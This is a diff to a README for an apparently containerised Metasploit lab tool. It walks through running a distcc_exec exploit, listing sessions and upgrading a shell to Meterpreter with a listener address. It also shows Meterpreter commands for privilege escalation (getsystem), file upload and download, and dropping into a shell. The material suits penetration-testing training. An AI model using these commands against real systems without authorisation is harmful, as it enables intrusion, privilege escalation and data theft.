@@ -130,59 +130,70 @@ python src/main.py
 # Using Meterpreter
 Once a successful exploit has been executed, you can use Meterpreter to interact with the compromised machine.
 ### Example
+Connect to the Metasploit RPC server:
 ```bash
-search exploits eternalblue
-search auxiliary ssh
-run exploit windows/smb/ms17_010_eternalblue
+connect
+(Optional) Search for modules:
+search exploits <keyword>
+search auxiliary <keyword>
 ```
-
-## 1. Check active sessions
+## 1. Execute an Exploit
+Run an exploit module; you will be prompted for any required options
+```bash
+run exploit unix/misc/distcc_exec
+```
+## 2. Check active sessions
 To see active Meterpreter sessions:
 ```bash
 sessions
 ```
-This will list available sessions with their session ID.
+Output will include:
 
-## 2. Interact with a session
-Replace <session_id> with an actual session ID from the list:
-```bash
-meterpreter <session_id> sysinfo
-```
+    Session ID
+    Type (shell/meterpreter)
+    Host and Port
+    Via (module that created the session)
 
-## 3. Run common Meterpreter commands
-Once inside a session, you can run various commands:
+run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555
 
-System Information:
-```bash
-meterpreter <session_id> sysinfo
+## 3. Upgrade to a Meterpreter Shell
+
+If you have only a plain shell, upgrade it to Meterpreter for richer functionality:
+
+    run post multi/manage/shell_to_meterpreter SESSION=<id> LHOST=<your_ip> LPORT=<listener_port>
+
+Example:
+
+    run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555
+
+## 4. Interact with a Meterpreter Session
+
+Replace <session_id> with the actual ID from sessions:
+
+### a. Basic commands
 ```
-List Processes:
-```bash 
-meterpreter <session_id> ps
-```
-Get System Privileges:
-```bash
-meterpreter <session_id> getsystem
-```
-Upload a file:
-```bash
-meterpreter <session_id> upload /path/to/local/file /path/to/remote/file
-```
-Download a file
-```bash
-meterpreter <session_id> download /path/to/remote/file /path/to/local/file
-```
-Run a Shell
-```bash
-meterpreter <session_id> shell
-```
-## Exit Meterpreter Session
-To exit a Meterpreter session:
-```bash
-meterpreter <session_id> exit
+meterpreter <session_id> sysinfo   # System information
+meterpreter <session_id> ps        # List processes
+meterpreter <session_id> getsystem # Attempt privilege escalation
 ```
 
-#### Clean Up
+### b. File operations
+```
+meterpreter <session_id> upload /local/path /remote/path   # Upload file
+meterpreter <session_id> download /remote/path /local/path # Download file
+```
+
+### c. Interactive shell
+```
+meterpreter <session_id> shell   # Drop into a command shell
+```
+
+### d. Exit session
+```
+meterpreter <session_id> exit    # Close the Meterpreter session
+```
+
+## 5. Clean Up
 To stop all running containers
 ```console
 docker compose stop
